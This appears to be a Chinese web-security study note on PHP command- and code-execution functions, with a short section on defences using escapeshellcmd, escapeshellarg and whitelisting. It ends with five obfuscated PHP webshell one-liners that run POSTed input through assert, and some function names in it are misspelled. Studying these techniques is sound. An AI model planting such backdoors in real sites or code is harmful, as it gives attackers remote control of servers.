#### 命令执行函数

system，exec，shell_exec，popen，passthru，proc_open，pcntl_exec

以dos或者shell的形式执行

常见绕过方法：

[![HVQTsg.png](https://s4.ax1x.com/2022/02/03/HVQTsg.png)](https://imgtu.com/i/HVQTsg)

常见反弹shell姿势见面试题

https://blog.csdn.net/qq_45552960/article/details/104576189

##### 防范

关于命令执行漏洞的防范大致有两种方式：一种是使用 PHP 自带的命令防注人函数，包括 escapeshellcmd() 和 escapeshellarg()，其中escapeshellemd() 是过滤的整条命令，所以它的参数是一整条命令，eseapeshellarg(） 函数则是用来保证传人命令执行函数里面的参数确实是以字符串参数形式存在的，不能被注人。除了使用这两个函数，还有对命令执行函数的参数做白名单限制，下面我们来详细介绍。

#### 代码执行函数

eval，assert，preg_replace，all_user_func，call_user_func_array，array_map，array_filter，create_function

执行脚本代码，可以同时结合命令执行函数

php代码执行

~~~php
变量覆盖 
<?php
$bb="assert";
$aa='bb';
$$aa($_POST['a']);
?>
等价替换
<?php
$a = str_replace("bb","","asbbsert");  
$a($_POST['a']);
?>
加密解密
<?php
$a = base64_decode("YXNzZXJ0");
$a($_POST['a']);
?>
符号.连接
$a = "a"."ss";
$b = "e"."rt";
$c = $a.$b;
$c($_POST['a']);
parse_str函数
<?php
$str = "a=assert";
parse_str($str);
$a($_POST['a']);
?>
~~~